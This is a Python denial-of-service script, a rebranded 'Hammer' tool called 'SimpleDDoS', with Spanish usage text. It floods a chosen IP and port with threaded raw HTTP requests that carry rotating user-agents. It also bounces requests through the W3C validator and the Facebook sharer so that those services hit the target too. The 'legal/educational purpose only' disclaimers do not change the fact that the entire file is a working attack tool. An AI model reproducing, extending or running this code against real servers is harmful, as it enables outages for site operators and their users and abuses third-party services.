#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın
# only for legal purpose


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
from colorama import Fore
import sys
hour = time.strftime("%H:%M:%S")
naranja = '\x1b[38;2;235;203;139m\x1b[360m'
morado = '\x1b[0;35m'



def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_ddoser(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mThe BOT is attacking...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (Fore.WHITE+"["+Fore.CYAN+"LOG"+Fore.WHITE+"]"+Fore.CYAN+" Attacking the IP:",host)
			else:
				s.shutdown(1)
				print("\033[91mShutdown\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print(Fore.WHITE+"["+Fore.CYAN+"CRITICAL"+Fore.WHITE+"]"+Fore.CYAN+" NO CONNECTION!!!")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_ddoser(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (Fore.CYAN+'''       
	╔═══════════════════════════════════════════════════════╗
	║ SimpleDDoS Tool by GhostTD                            ║
	║ Herramienta solo para proposito educativo.            ║
	║ Al hacer los ataques tu IP es visible. Ten cuidado.   ║
	╚═══════════════════════════════════════════════════════╝
	\n
	╔═════════════════════════════════════════╗
	║ usage : python3 ddos.py [-s] [-p] [-t]  ║
	║ -h : ayuda                              ║
	║ -s : Direccion IP                       ║
	║ -p : Puerto (Default 80)                ║
	║ -t : Turbo (Default 135)                ║
	╚═════════════════════════════════════════╝''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="AdvancedDDoS Options")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="Ataque al IP del Server: -s <ip>")
	optp.add_option("-p","--port",type="int",dest="port",help="-p (Puerto 80 default)")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="-t <turbo> (Turbo 135 Default)")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
    
	print(Fore.CYAN+"""
                    ╔═╗┬┌┬┐┌─┐┬  ┌─┐╔╦╗╔╦╗┌─┐╔═╗
                    ╚═╗││││├─┘│  ├┤  ║║ ║║│ │╚═╗
                    ╚═╝┴┴ ┴┴  ┴─┘└─┘═╩╝═╩╝└─┘╚═╝v1.0"""+morado+"""
              ╔═════════════════════════════════════╗
              ║                                     ║
              ║ IP: """+naranja+str(host)+morado+"""                     ║
              | PORT: """+naranja+str(port)+morado+"""                            ║
              ║ TIME:"""+naranja+""" [INFINITE]"""+morado+"""                    ║
              ║ VIP:"""+Fore.RED+"""false"""+morado+"""                            ║
              ║ HOUR: """+naranja+"""["""+hour+"""]"""+morado+"""                    ║
              ║                                     ║
              ║     SIMPLEDDOS V1.0 BY GHOSTTD      ║
              ╚═════════════════════════════════════╝ Starting Attack...""")
	user_agent()
	my_bots()
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mVerificar IP y Puerto\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
